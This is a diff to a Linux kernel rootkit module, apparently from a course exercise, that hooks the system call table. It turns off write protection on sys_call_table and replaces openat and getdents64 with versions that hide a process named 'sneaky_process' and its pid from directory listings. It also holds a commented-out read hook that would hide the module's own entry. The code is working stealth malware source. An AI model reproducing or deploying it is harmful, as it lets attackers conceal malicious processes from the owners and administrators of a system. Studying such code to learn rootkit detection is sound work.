@@ -8,6 +8,7 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
@@ -75,28 +76,26 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
  * @brief functor to original getdents64
  * 
  */
-asmlinkage int(*original_getdents64)(unsigned int fd, struct linux_dirent* dirp, unsigned int count);
+asmlinkage int(*original_getdents64)(struct pt_regs *regs);
 
 /**
  * @brief sneaky getdents64
  * 
- * @param fd 
- * @param dirp 
- * @param count 
- * @return number of bytes read 
+ * @param regs 
+ * @return asmlinkage 
  */
-asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent* dirp, unsigned int count){
-  int totalDirpLength = original_getdents64(fd, dirp, count);
- 
+asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
+  int totalDirpLength = original_getdents64(regs);
+  struct linux_dirent64* dirp = (void*)(regs->si);
+
   int curr = 0;
   while(curr < totalDirpLength){
-    linux_dirent_t* dirpTemp = (void*)dirp + curr;
-
+    struct linux_dirent64* dirpTemp = (void*)dirp + curr;
     if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
       int reclen = dirpTemp->d_reclen;
       int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
       void* source = (void*)dirpTemp + reclen;
-      memmove(dirpTemp, source, lenToBeCopied);
+      memmove((void*)(regs->si) + curr, source, lenToBeCopied);
       totalDirpLength -= reclen;
     }
     else{
@@ -111,7 +110,9 @@ asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent* dirp,
  * @brief functor to original read
  * 
  */
-asmlinkage ssize_t (*original_read)(int fd, void* buf, size_t count);
+// asmlinkage ssize_t (*original_read)(int fd, void* buf, size_t count);
+asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
+
 
 /**
  * @brief sneaky read
@@ -121,19 +122,19 @@ asmlinkage ssize_t (*original_read)(int fd, void* buf, size_t count);
  * @param count 
  * @return number of bytes read
  */
-asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, size_t count){
-  ssize_t bytesRead = original_read(fd, buf, count);
-  if(bytesRead > 0){
-    void* posStart = strstr(buf, "sneaky_mod");
-    if(posStart != NULL){
-      void* posEnd = strstr(posStart, "\n");
-      if(posEnd != NULL){
-        int size = posEnd - posStart + 1;
-        memmove(posStart, posEnd + 1, bytesRead - (posStart - buf) - size);
-        bytesRead -= size;
-      }
-    }
-  }
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
+  ssize_t bytesRead = original_read(regs);
+  // if(bytesRead > 0){
+  //   void* posStart = strstr(buf, "sneaky_mod");
+  //   if(posStart != NULL){
+  //     void* posEnd = strstr(posStart, "\n");
+  //     if(posEnd != NULL){
+  //       int size = posEnd - posStart + 1;
+  //       memmove(posStart, posEnd + 1, bytesRead - (posStart - buf) - size);
+  //       bytesRead -= size;
+  //     }
+  //   }
+  // }
   return bytesRead;
 }
 
@@ -155,14 +156,14 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void*)sys_call_table[__NR_openat];
-  original_getdents64 = (void*)sys_call_table[__NR_getdents];
+  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
   // original_read = (void*)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-  sys_call_table[__NR_getdents] = (unsigned long)sneaky_sys_getdents64;
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   
   // Turn write protection mode back on for sys_call_table
@@ -182,7 +183,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
-  sys_call_table[__NR_getdents] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
   // sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
